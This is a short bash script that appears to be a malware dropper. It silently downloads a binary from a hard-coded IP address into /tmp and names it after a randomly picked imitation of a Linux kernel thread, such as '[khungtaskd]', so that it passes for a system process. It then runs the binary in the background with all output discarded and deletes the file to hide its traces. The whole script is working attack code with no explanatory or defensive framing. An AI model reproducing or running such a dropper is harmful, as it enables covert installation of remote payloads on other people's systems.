#!/bin/bash
WORK_DIR="/tmp"
RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]" "[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")
RANDOMIZE=$(( (RANDOM % 7)  + 0))
BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
FULL_BIN_PATH="${WORK_DIR}/${BIN_FILE}"

if command -v curl 1> /dev/null; then
    curl -s "http://172.16.10.1/system_sleep" -o "${FULL_BIN_PATH}"
    chmod +x "${FULL_BIN_PATH}"
    export PATH="${WORK_DIR}:${PATH}"
    cd /tmp
    nohup ${BIN_FILE} &> /dev/null &
    rm -- ${FULL_BIN_PATH}
fi